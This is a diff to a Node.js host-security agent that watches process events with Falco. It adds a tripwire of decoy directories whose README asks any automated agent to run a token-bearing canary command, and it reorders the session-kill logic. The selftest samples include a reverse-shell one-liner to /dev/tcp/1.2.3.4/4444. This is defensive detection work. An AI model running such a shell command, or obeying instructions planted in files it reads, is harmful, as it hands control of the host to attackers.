@@ -13,6 +13,10 @@
 //                                             # process sharing the offender's session id is
 //                                             # killed, and the session is quarantined (what it
 //                                             # spawns next is killed too) for 10 minutes
+//   sudo node sentinel-agent.mjs --tripwire   # (any mode) plant decoys whose README asks an
+//                                             # agent to run one canary command; running it is
+//                                             # a conviction, looking at the decoy is an alert
+//   sudo node sentinel-agent.mjs --tripwire-remove   # take the decoys away again, then exit
 //   node sentinel-agent.mjs --selftest        # score sample payloads, no Falco/root
 //
 //   env: ANTHROPIC_API_KEY (tier 2 on Claude), OPENAI_BASE_URL+OPENAI_MODEL (local judge),
@@ -21,6 +25,8 @@
 //        ARIS_INCIDENTS (incident log path) ARIS_VERBOSE=1 (log every allow too)
 //        ARIS_CLOUD_URL + ARIS_INGEST_KEY (off-box alerts)
 //        ARIS_FAIL_MODE=alert (page instead of block when tier-2 errors/refuses)
+//        ARIS_TRIPWIRE_STATE (where the tripwire token is kept, 0600)
+//        ARIS_TRIPWIRE_DIRS (comma-separated decoy directories)
 //        ARIS_TIER2_TIMEOUT_MS / _DEADLINE_MS / _CACHE_TTL_MS / _CONCURRENCY / _BUDGET_PER_MIN
 //
 // Decisions (see sentinel-core.mjs):
@@ -30,6 +36,8 @@
 //   block → MONITOR: logged + reported.  ENFORCE: killed (unless protected).
 //   alert → logged + reported, NEVER killed (tier-2 unavailable / budget spent).
 //   error → the detector threw: logged + reported as an incident, never dropped silently.
+//   With --tripwire: the canary command executed → block (the one conviction that needs no
+//   narration and no judge); the decoy merely addressed → alert.
 
 import { spawn } from "node:child_process";
 import { readFileSync, appendFileSync, readdirSync, statSync } from "node:fs";
@@ -37,7 +45,7 @@ import { basename, isAbsolute, resolve as resolvePath } from "node:path";
 import { hostname } from "node:os";
 import { createInterface } from "node:readline";
 import { pathToFileURL } from "node:url";
-import { decide, decideSession, defaultSessions, hasTier2, providers, providerWarnings } from "./sentinel-core.mjs";
+import { armTripwire, createTripwire, decide, decideSession, defaultSessions, disarmTripwire, hasTier2, newTripwireToken, providers, providerWarnings, tripwireDecoy } from "./sentinel-core.mjs";
 
 // SAFE BY DEFAULT: the agent detects + alerts + logs but NEVER kills unless you pass
 // --enforce. A false positive can't take down a customer's prod on day one; you flip
@@ -52,6 +60,14 @@ const ENFORCE = process.argv.includes("--enforce");
 // process, and never touches the agent's own session.
 const KILL_SESSION = process.argv.includes("--kill-session");
 const QUARANTINE_MS = (() => { const n = Number(process.env.ARIS_SESSION_QUARANTINE_MS ?? 600_000); return Number.isFinite(n) && n >= 0 ? n : 600_000; })();
+// TRIPWIRE is its own opt-in and works in every mode. It plants a decoy directory whose
+// README asks any automated agent to run one command carrying a per-host random token.
+// That command executing is a block (killed only in --enforce, like every block); a command
+// that merely addresses the decoy is an alert. See the core for the policy.
+const TRIPWIRE = process.argv.includes("--tripwire");
+const TRIPWIRE_REMOVE = process.argv.includes("--tripwire-remove");
+const TRIPWIRE_STATE = process.env.ARIS_TRIPWIRE_STATE || "/var/lib/aris-sentinel/tripwire.json";
+const TRIPWIRE_DIRS = (process.env.ARIS_TRIPWIRE_DIRS || "").split(",").map((s) => s.trim()).filter(Boolean);
 const SELFTEST = process.argv.includes("--selftest");
 const VERBOSE = process.env.ARIS_VERBOSE === "1";
 const FALCO_BIN = process.env.FALCO_BIN || "falco";
@@ -303,11 +319,15 @@ function writeIncident(incident) {
   try { appendFileSync(INCIDENT_LOG, JSON.stringify(incident) + "\n"); } catch (e) { log(`incident log write failed: ${e.message}`); }
 }
 
+// The tripwire token must never reach a log line or an incident: an operator who later
+// greps the incident log for it would be running a command that carries it.
+const clean = (s) => (deps.tripwire && typeof s === "string" ? deps.tripwire.redact(s) : s);
+
 function procFields(f) {
   const comm = basename(f["proc.exe"] || f["proc.pname"] || "");
   return {
     pid: Number(f["proc.pid"]), ppid: Number(f["proc.ppid"]), sid: Number(f["proc.sid"]),
-    user: f["user.name"], exe: comm, cwd: f["proc.cwd"] ?? null, cmdline: f["proc.cmdline"],
+    user: f["user.name"], exe: comm, cwd: f["proc.cwd"] ?? null, cmdline: clean(f["proc.cmdline"]),
   };
 }
 
@@ -320,11 +340,11 @@ function respond(f, d, payload) {
   // `alert` is never a kill: tier 2 could not judge it, so we page a human instead.
   const guard = d.decision === "block" ? isProtected(p.pid, p.exe) : null;
   const action =
-    d.decision === "alert" ? "ALERT (tier-2 unavailable — no kill)"
+    d.decision === "alert" ? (d.viaTripwire ? "ALERT (decoy addressed, not run — no kill)" : "ALERT (tier-2 unavailable — no kill)")
     : !deps.mode.enforce ? "DETECTED (monitor — no kill)"
     : guard ? `SPARED (${guard})`
     : "KILL";
-  log(`SENTINEL ${action}  tier-${d.tier}  pid=${p.pid} ppid=${p.ppid} sid=${p.sid} user=${p.user} exe=${p.exe}${decoded}${sess}  score=${d.score.toFixed(2)}${how ? " " + how : ""}`);
+  log(`SENTINEL ${action}  ${d.viaTripwire ? "tripwire" : `tier-${d.tier}`}  pid=${p.pid} ppid=${p.ppid} sid=${p.sid} user=${p.user} exe=${p.exe}${decoded}${sess}  score=${d.score.toFixed(2)}${how ? " " + how : ""}`);
   log(`            cmd: ${(p.cmdline || "").slice(0, 200)}`);
   if (d.reason) log(`            ${d.reason}`);
   if (d.adjudication?.reasoning) log(`            reasoning: ${d.adjudication.reasoning}`);
@@ -335,28 +355,35 @@ function respond(f, d, payload) {
     ...p, score: d.score, signals: d.signals, reason: d.reason,
     conf: d.adjudication?.confidence ?? null, reasoning: d.adjudication?.reasoning ?? null,
     // When the session convicted, the evidence is the session's words, not this one exec's.
-    narration: narrationSnippet(d.viaSession ? d.scoredLayer : payload),
+    narration: clean(narrationSnippet(d.viaSession ? d.scoredLayer : payload)),
     via_session: !!d.viaSession, session: d.session ?? null,
+    // kind "token": the canary command ran. kind "decoy": the decoy was addressed. Never the token itself.
+    tripwire: d.tripwire ?? null,
   };
 
   // Egress the alert to Aris Cloud FIRST — before we touch the process.
   reportToCloud(base);
 
-  let killed = [];
-  if (deps.mode.enforce && d.decision === "block" && !guard) killed = deps.killTree(p.pid);
-
   // Session kill: only on a conviction, only when armed twice (--enforce --kill-session).
   // It runs even when the offending process itself was spared (a protected interpreter can
   // still be the door an agent is walking through); each member faces the same guard.
+  //
+  // ORDER MATTERS, and the session goes FIRST. The shell that launched the offender is
+  // blocked waiting for it; killing the offender first is what wakes that shell up, and it
+  // ran its next command in the milliseconds before the session kill reached it (found
+  // live on 2026-11-10, with both a narrated attacker and the tripwire). So: the rest of
+  // the session dies while the offender still holds it, the offender's tree dies last.
+  const armed = deps.mode.enforce && d.decision === "block";
   let sessionKill = null;
-  if (deps.mode.enforce && deps.mode.killSession && d.decision === "block") {
-    sessionKill = killSession(p.sid, new Set(killed));
+  if (armed && deps.mode.killSession) {
+    sessionKill = killSession(p.sid, guard ? new Set() : new Set([p.pid]), p.pid);
     if (sessionKill.why) log(`            session ${p.sid}: not killed (${sessionKill.why})`);
-    else {
-      log(`            SESSION KILL sid=${p.sid}: killed ${sessionKill.killed.length} more process(es)${sessionKill.spared.length ? `, spared ${sessionKill.spared.map((x) => `${x.pid}(${x.why})`).join(" ")}` : ""}; quarantined for ${Math.round(QUARANTINE_MS / 1000)}s`);
-      killed = [...killed, ...sessionKill.killed];
-    }
+    else log(`            SESSION KILL sid=${p.sid}: killed ${sessionKill.killed.length} more process(es)${sessionKill.spared.length ? `, spared ${sessionKill.spared.map((x) => `${x.pid}(${x.why})`).join(" ")}` : ""}; quarantined for ${Math.round(QUARANTINE_MS / 1000)}s`);
   }
+
+  let killed = [];
+  if (armed && !guard) killed = deps.killTree(p.pid);
+  if (sessionKill && !sessionKill.why) killed = [...new Set([...killed, ...sessionKill.killed])];
 
   writeIncident({ ...base, tier2: d.adjudication || null, killed, session_kill: sessionKill });
 }
@@ -369,13 +396,21 @@ function respond(f, d, payload) {
 const OWN_SIDS = new Set([...selfAncestors].map(procSid).filter((n) => n !== null));
 const quarantined = new Map(); // sid -> { until, since, count }
 
-/** Kill every process in session `sid` that the guard allows, then quarantine the sid. */
-function killSession(sid, already) {
+/**
+ * Kill every process in session `sid` that the guard allows (`skip` excepted: the offender,
+ * whose tree the caller kills right after), then quarantine the sid.
+ * The offender's ancestors go first, outermost first: each of them is waiting on the one
+ * below it, so killing from the top down never wakes a process up to run one more command.
+ */
+function killSession(sid, skip, offender) {
   const out = { sid, killed: [], spared: [], why: null };
   if (!(Number.isInteger(sid) && sid > 1)) return { ...out, why: "no session id" };
   if (deps.ownSids.has(sid)) return { ...out, why: "the session the agent runs in or was started from" };
-  for (const pid of deps.sessionPids(sid)) {
-    if (already.has(pid)) continue;
+  const up = offender ? deps.ancestorsOf(offender) : []; // [offender, parent, grandparent, …]
+  const rank = new Map(up.map((pid, i) => [pid, i + 1]));
+  const members = [...deps.sessionPids(sid)].sort((a, b) => (rank.get(b) ?? 0) - (rank.get(a) ?? 0)); // stable: the rest keep their order
+  for (const pid of members) {
+    if (skip.has(pid)) continue;
     const guard = isProtected(pid, deps.procName(pid));
     if (guard) { out.spared.push({ pid, why: guard }); continue; }
     try { deps.killPid(pid); out.killed.push(pid); } catch {}
@@ -424,7 +459,7 @@ function respondError(f, e, payload) {
   const incident = {
     host: HOST, ts: now(), decision: "error", tier: null, action: "errored",
     ...p, score: null, signals: [], reason: "detector exception — payload not judged", error,
-    conf: null, reasoning: null, narration: narrationSnippet(payload),
+    conf: null, reasoning: null, narration: clean(narrationSnippet(payload)),
   };
   reportToCloud(incident);
   writeIncident(incident);
@@ -440,11 +475,14 @@ export const sessionKeyOf = (f) => {
 
 // Injectable seams for tests (swap `deps.decide` to simulate a throwing detector).
 // `mode` is what the process was started with; the kill primitives are real /proc + SIGKILL.
+// `tripwire` is this host's matcher once main() has armed it (null otherwise).
 export const deps = {
-  decide: (payload, sessionKey) => decideSession(sessionKey, payload),
+  decide: (payload, sessionKey, ctx = {}) => decideSession(sessionKey, payload, { tripwire: deps.tripwire, cwd: ctx.cwd }),
+  tripwire: null,
   mode: { enforce: ENFORCE, killSession: ENFORCE && KILL_SESSION },
   killTree,
   sessionPids,
+  ancestorsOf: (pid) => [...ancestorsOf(pid)], // [pid, parent, grandparent, …] from /proc
   procName: (pid) => procStatus(pid)?.name ?? "",
   killPid: (pid) => process.kill(pid, "SIGKILL"),
   ownSids: OWN_SIDS,
@@ -468,7 +506,7 @@ export async function handleEvent(f) {
   if (decided.size > DEDUP_MAX) decided.delete(decided.keys().next().value);
 
   let d;
-  try { d = await deps.decide(payload, sessionKeyOf(f)); } catch (e) { return respondError(f, e, payload); }
+  try { d = await deps.decide(payload, sessionKeyOf(f), { cwd: f["proc.cwd"] }); } catch (e) { return respondError(f, e, payload); }
   if (d.decision === "block" || d.decision === "alert") return respond(f, d, payload);
   if (VERBOSE) log(`allow  tier-${d.tier}  pid=${pid} exe=${basename(f["proc.exe"] || "")}  score=${d.score.toFixed(2)}  ${d.reason}`);
   return d;
@@ -482,9 +520,16 @@ async function selftest() {
     { name: "benign command (expect allow)", cmdline: `python3 manage.py migrate --noinput` },
     { name: "terse malware (expect allow, tier-1 only)", cmdline: `bash -c bash -i >& /dev/tcp/1.2.3.4/4444 0>&1` },
   ];
+  // A throwaway tripwire (nothing is planted): the decoy's own command, then a look at the decoy.
+  const token = newTripwireToken();
+  const tripwire = createTripwire({ token, dirs: ["/opt/vault-access"] });
+  samples.push(
+    { name: "tripwire: the decoy's canary command executed (expect BLOCK)", cmdline: tripwireDecoy(token, "/opt/vault-access", "linux").command },
+    { name: "tripwire: the decoy read, not run (expect ALERT)", cmdline: "cat /opt/vault-access/README.md" },
+  );
   for (const s of samples) {
-    const d = await decide(extractPayload({ "proc.cmdline": s.cmdline, "proc.exe": s.cmdline.split(" ")[0] }));
-    log(`[${d.decision.toUpperCase().padEnd(5)}] tier-${d.tier} score=${d.score.toFixed(2)}  ${s.name}`);
+    const d = await decide(extractPayload({ "proc.cmdline": s.cmdline, "proc.exe": s.cmdline.split(" ")[0] }), { tripwire });
+    log(`[${d.decision.toUpperCase().padEnd(5)}] ${d.viaTripwire ? "tripwire" : `tier-${d.tier}`} score=${d.score.toFixed(2)}  ${s.name}`);
     log(`         signals=[${d.signals.join(", ")}]  ${d.reason}\n`);
   }
   log("selftest done. Arm with: sudo node sentinel-agent.mjs");
@@ -499,6 +544,13 @@ function main() {
   for (const w of providerWarnings()) log(`  WARN ${w}`);
   log(`  fail mode: ${process.env.ARIS_FAIL_MODE === "alert" ? "alert (tier-2 errors page, never block)" : "closed (tier-2 errors block as suspicious)"}`);
   log(`  session evidence: ${defaultSessions.enabled ? "ON (narration accumulated per proc.sid; judged as a transcript, never a tier-1 kill)" : "off (ARIS_SESSION_TTL_MS=0)"}`);
+  if (TRIPWIRE) {
+    const a = armTripwire({ stateFile: TRIPWIRE_STATE, dirs: TRIPWIRE_DIRS });
+    deps.tripwire = a.tripwire;
+    if (a.error) log(`  tripwire: NOT ARMED (${a.error}) — nothing planted, nothing matched`);
+    else log(`  tripwire: ON (${a.created ? "new token" : "existing token"} ${a.tripwire.fingerprint}; decoys: ${a.tripwire.dirs.join(", ") || "none"}) — canary command run -> block, decoy addressed -> alert`);
+    for (const s of a.skipped) log(`  WARN tripwire: no decoy at ${s.dir} (${s.why})`);
+  } else log(`  tripwire: off (pass --tripwire to plant decoys)`);
   log(`  cloud alerts: ${CLOUD_URL ? `-> ${CLOUD_URL} (Telegram via Aris Cloud)` : "disabled (set ARIS_CLOUD_URL)"}`);
   log(`  incidents -> ${INCIDENT_LOG}`);
 
@@ -531,5 +583,8 @@ function main() {
 const isMain = process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href;
 if (isMain) {
   if (SELFTEST) selftest();
-  else main();
+  else if (TRIPWIRE_REMOVE) {
+    const r = disarmTripwire({ stateFile: TRIPWIRE_STATE });
+    log(r.armed ? `tripwire removed: ${r.removed.length} path(s) deleted${r.kept.length ? `, left in place: ${r.kept.join(", ")}` : ""}` : `no tripwire state at ${TRIPWIRE_STATE}; nothing to remove`);
+  } else main();
 }
